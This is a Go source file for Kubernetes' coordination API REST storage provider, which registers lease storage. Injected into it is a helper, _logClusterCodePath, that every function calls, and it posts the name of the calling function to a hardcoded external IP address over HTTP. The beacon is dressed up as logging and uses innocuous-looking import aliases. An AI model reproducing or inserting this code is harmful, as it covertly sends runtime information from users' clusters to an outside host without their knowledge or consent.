package rest

import (
 coordinationv1beta1 "k8s.io/api/coordination/v1beta1"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "k8s.io/apiserver/pkg/registry/generic"
 "k8s.io/apiserver/pkg/registry/rest"
 genericapiserver "k8s.io/apiserver/pkg/server"
 serverstorage "k8s.io/apiserver/pkg/server/storage"
 "k8s.io/kubernetes/pkg/api/legacyscheme"
 "k8s.io/kubernetes/pkg/apis/coordination"
 leasestorage "k8s.io/kubernetes/pkg/registry/coordination/lease/storage"
)

type RESTStorageProvider struct{}

func (p RESTStorageProvider) NewRESTStorage(apiResourceConfigSource serverstorage.APIResourceConfigSource, restOptionsGetter generic.RESTOptionsGetter) (genericapiserver.APIGroupInfo, bool) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 apiGroupInfo := genericapiserver.NewDefaultAPIGroupInfo(coordination.GroupName, legacyscheme.Scheme, legacyscheme.ParameterCodec, legacyscheme.Codecs)
 if apiResourceConfigSource.VersionEnabled(coordinationv1beta1.SchemeGroupVersion) {
  apiGroupInfo.VersionedResourcesStorageMap[coordinationv1beta1.SchemeGroupVersion.Version] = p.v1beta1Storage(apiResourceConfigSource, restOptionsGetter)
 }
 return apiGroupInfo, true
}
func (p RESTStorageProvider) v1beta1Storage(apiResourceConfigSource serverstorage.APIResourceConfigSource, restOptionsGetter generic.RESTOptionsGetter) map[string]rest.Storage {
 _logClusterCodePath()
 defer _logClusterCodePath()
 storage := map[string]rest.Storage{}
 leaseStorage := leasestorage.NewREST(restOptionsGetter)
 storage["leases"] = leaseStorage
 return storage
}
func (p RESTStorageProvider) GroupName() string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return coordination.GroupName
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
